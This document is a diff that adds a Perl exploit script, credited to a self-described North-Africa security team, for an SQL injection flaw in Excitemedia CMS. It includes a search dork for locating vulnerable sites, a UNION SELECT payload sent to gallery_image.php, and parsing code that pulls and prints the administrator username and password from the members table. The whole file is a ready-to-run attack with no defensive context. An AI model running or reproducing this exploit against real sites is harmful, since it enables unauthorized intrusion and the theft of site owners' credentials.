@@ -1,0 +1,38 @@
+#!/usr/bin/perl -w
+
+# Excitemedia CMS Sql injection vulnerability #
+########################################
+#[+] Author : Dr.0rYX AND Cr3W-DZ
+#[+] Greetz : HIS0K4 - claw and all the other friends
+#[+] inurl:”gallery_image.php?image_id=”
+#[+] Vendor: http://www.excitemedia.com.au
+#[+] sell script with host  
+########################################
+print "\t\t| NORTH-AFRICA SECURITY TEAM |\n\n";
+print "[x] Dr.0rYX AND Cr3W-DZ\n\n";
+print "[x] N.A.S.T\n\n";
+print "[x] Excitemedia Cms Sql injection vulnerability\n\n";
+print "[x] www.nasteam.wordpress.com\n\n";
+print "\t\t| vx3[at]hotmail.de  |\n\n";
+print "\t\t| cr3w[at]hotmail.de |\n\n";
+use LWP::UserAgent;
+print "\nTarget page:[http://site/path/]: ";
+chomp(my $target=<STDIN>);
+$column_name="concat(0x757365723d,username,0x3a,0x70617373776f72643d,password)";
+$table_name="members";
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+$host = $target."/gallery_image.php?image_id=1 and 1=0 union select 1,2,".$column_name.",4,5,6,7,8 from ".$table_name." 
+
+limit 0,1--";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content; if ($answer =~ /user=(.*?):/){
+print "\n[+] Admin username : $1\n\n";
+}
+else{print "\nError\n";
+}
+$answer = $res->content; if ($answer =~ /password=(.*?)<\/div>/){
+print "\n[+] Admin password : $1\n\n";
+}
+else{print "\nError\n";
+} 
